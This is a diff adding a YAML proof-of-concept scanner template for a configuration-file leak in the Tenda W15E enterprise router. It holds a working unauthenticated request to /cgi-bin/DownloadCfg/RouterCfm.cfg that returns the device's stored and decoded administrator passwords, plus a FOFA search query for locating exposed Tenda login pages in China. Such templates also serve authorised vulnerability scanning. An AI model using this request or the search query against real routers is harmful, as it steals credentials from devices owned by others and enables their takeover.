@@ -1,0 +1,22 @@
+id: poc-yaml-tenda-w15e-enterprise-level-router-routercfm-cfg-configuration-file-leak
+info:
+  name: Tenda W15E企业级路由器 RouterCfm.cfg 配置文件泄漏漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: Tenda W15E企业级路由器
+  fofa: title=="Tenda | Login" && country="CN"
+requests:
+- method: GET
+  path: /cgi-bin/DownloadCfg/RouterCfm.cfg
+  expression: 'status_code == 200
+
+    && contains(body,"sys.userpass=")
+
+    && contains(body,"sys.userpass.decode.pwd=")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
